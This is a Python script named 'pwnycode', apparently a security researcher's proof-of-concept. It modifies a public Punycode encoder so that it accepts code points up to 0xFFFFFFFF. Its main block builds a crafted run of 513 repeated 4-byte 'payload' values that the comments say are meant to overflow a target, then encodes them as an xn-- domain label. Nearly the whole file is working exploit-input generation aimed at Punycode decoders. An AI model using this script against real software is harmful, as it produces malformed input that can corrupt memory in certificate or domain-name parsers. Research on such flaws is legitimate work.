#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Copyright (C) 2022 by Amazon Web Services <colm@amazon.com>
#
# pwnycode.py is a modified version of a PunyCode parser from
# Ben Noordhuis at https://gist.github.com/bnoordhuis/1035947
#

# Copyright (C) 2011 by Ben Noordhuis <info@bnoordhuis.nl>
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

TMIN = 1
TMAX = 26
BASE = 36
SKEW = 38
DAMP = 700 # initial bias adaptation
INITIAL_N = 128
INITIAL_BIAS = 72

assert 0 <= TMIN <= TMAX <= (BASE - 1)
assert 1 <= SKEW
assert 2 <= DAMP
assert (INITIAL_BIAS % BASE) <= (BASE - TMIN) # always true if TMIN=1

class Error(Exception):
    pass

def basic(c):
    return c < 128

def encode_digit(d):
    return d + (97 if d < 26 else 22)

def decode_digit(d):
    if d >= 48 and d <= 57:
        return d - 22 # 0..9
    if d >= 65 and d <= 90:
        return d - 65 # A..Z
    if d >= 97 and d <= 122:
        return d - 97 # a..z
    raise Error('Illegal digit #%d' % d)

def next_smallest_codepoint(non_basic, n):
    # MODIFICATION -  pwnycode can go up to MAXINT - 511 rather than
    # just the max unicode character code point
    m = 0xFFFFFFFF
    for c in non_basic:
        if c >= n and c < m:
            m = c
    # MODIFICATION - same change here
    #assert m < (0xFFFFFFFF)
    return m

def adapt_bias(delta, n_points, is_first):
    # scale back, then increase delta
    delta //= DAMP if is_first else 2
    delta += delta // n_points

    s = (BASE - TMIN)
    t = (s * TMAX) // 2 # threshold=455
    k = 0

    while delta > t:
        delta //= s
        k += BASE

    a = (BASE - TMIN + 1) * delta
    b = (delta + SKEW)

    return k + (a // b)

def threshold(k, bias):
    """Calculate the new threshold."""
    if k <= bias + TMIN:
        return TMIN
    if k >= bias + TMAX:
        return TMAX
    return k - bias

def encode_int(bias, delta):
    """Encode bias and delta to a generalized variable-length integer."""
    result = []

    k = BASE
    q = delta

    while True:
        t = threshold(k, bias)
        if q < t:
            result.append(encode_digit(q))
            break
        else:
            c = t + ((q - t) % (BASE - t))
            q = (q - t) // (BASE - t)
            k += BASE
            result.append(encode_digit(c))

    return result

def encode(input):
    # MODIFICATION = just take an array of ints to start with
    # input = [ord(c) for c in input]
    output = [c for c in input if basic(c)]
    non_basic = [c for c in input if not basic(c)]

    # remember how many basic code points there are
    b = h = len(output)

    if output:
        output.append(ord('-'))

    n = INITIAL_N
    bias = INITIAL_BIAS
    delta = 0

    while h < len(input):
        m = next_smallest_codepoint(non_basic, n)
        delta += (m - n) * (h + 1)
        n = m

        for c in input:
            if c < n:
                delta += 1
                assert delta > 0
            elif c == n:
                output.extend(encode_int(bias, delta))
                bias = adapt_bias(delta, h + 1, b == h)
                delta = 0
                h += 1

        delta += 1
        n += 1

    # MODIFICATION - return a string with the xn-- prefix
    return 'xn--' + ''.join(chr(c) for c in output)

if __name__ == '__main__':
    # This is the 4-bytes that you would like to overflow
    payload = 0xFFFFFFFF

    if basic(payload):
        pwnycode = [ 0x000000FE, 0x000000FE ]
        pwnycode.extend([ payload ] * 511)
        print(pwnycode)
    else:
        pwnycode = [ payload ] * 513

    # Work from payload + 513, payload + 512 ... all the way to payload
    # with the payload right at the end
    #pwnycode = [ *range(payload + 512, payload - 1, -1) ]

    # print the encoded punycode
    print(encode(pwnycode))
